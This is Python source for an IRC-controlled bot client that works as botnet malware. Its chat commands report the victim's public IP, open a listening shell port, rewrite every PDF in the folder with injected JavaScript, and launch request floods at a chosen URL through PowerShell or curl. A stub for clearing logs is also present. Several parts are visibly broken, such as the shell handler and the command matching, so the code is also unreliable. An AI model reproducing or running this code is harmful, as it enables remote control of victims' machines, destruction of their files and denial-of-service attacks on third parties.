#!/usr/bin/python3
# -*- coding: utf-8 -*-
########################################
###############imports##################
########################################
import pydle
from requests import get
from multiprocessing import Process

# import threading
# import pypsrp

import socket
import random
import re
import platform
import sys, os, time
import subprocess

########################################
############pre-config var##############
########################################
os = platform.system()
########################################


def getos():
    return platform.system()


def shell(port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        hote = ""
        print(hote)
        server.bind((hote, port))
        server.listen(5)
        server.accept()
        while True:
            message = server.recv(1024).decode("utf8")
            if message == "!stop":
                server.send("Server stopping...".encode("utf8"))
                server.close()
                break
            if message == None:
                break
    except OSError:
        server.close()
    finally:
        server.close()


def clear_logs():
    ## invoke PS and clear logs
    pass


class MyOwnBot(pydle.Client):
    async def on_connect(self):
        await self.join("#net")

    async def on_message(self, target, source, message):
        # don't respond to our own messages, as this leads to a positive feedback loop
        if message == "!ip":
            ip = get("https://api.ipify.org").text
            await self.message(target, format(ip))

        if message == "!os":
            await self.message(target, getos())

        if message == "!spawn_shell":
            ip = get("https://api.ipify.org").text
            port = random.randint(1025, 3000)
            message = "shell available on " + ip + ":" + str(port)
            await self.message(target, message)
            p = Process(target=shell(port))
            p.start()

        if message == "!stop_shell":
            p.terminate()
            p.join()
            message = "Shell stopped"
            await self.message(target, message)

        if message == "!infect_pdf":
            try:
                message = "Backdoring PDF all files"
                from PyPDF2 import PdfFileWriter, PdfFileReader
                import glob

                listOfFiles = glob.glob("*.pdf")
                for i in listOfFiles:
                    output = PdfFileWriter()
                    ipdf = PdfFileReader(open(f"{i}", "rb"))

                    with open(f"{i}", "wb") as f:
                        print(i)
                        output.addJS("app.alert('PWNED', 3);")
                        output.write(f)
            except:
                message = "Error"
            await self.message(target, message)

        if message == "!infect_pdf":
            try:
                message = "Backdoring PDF all files"
                from PyPDF2 import PdfFileWriter, PdfFileReader
                import glob

                listOfFiles = glob.glob("*.pdf")
                pdf_content = []
                for i in listOfFiles:
                    output = PdfFileWriter()
                    ipdf = PdfFileReader(open(f"{i}", "rb"))

                    with open(f"{i}", "wb") as f:
                        reader = PdfFileReader(f)
                        for page in reader.pages:
                            content = reader.getPage(page)
                            pdf_content.append(content.extractText())

            except:
                message = "Error"
            await self.message(target, message)

        if message == message.startswith("!ddos_set_target"):
            target_url = re.findall("https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+", message)

        if message == message.startswith("!ddos_start"):
            count = re.findall("^[-+]?[0-9]+$", message)
            if os.startswith("Windows"):
                ## ADD PS hidden prompt on target
                req = (
                    "for ($i=0, $i -lt "
                    + count
                    + ",$i++){$Response = Invoke-WebRequest -URI "
                    + target_url
                    + ' | Where-Object {$_.name -like "* Value*"} | Select-Object Name, Value}'
                )
            elif os.startswith("Linux"):
                os.system("curl " + target_url)


# def check_valid_key():

client = MyOwnBot("BoBiBot", realname="bot")
client.run("localhost", tls=False, tls_verify=False)
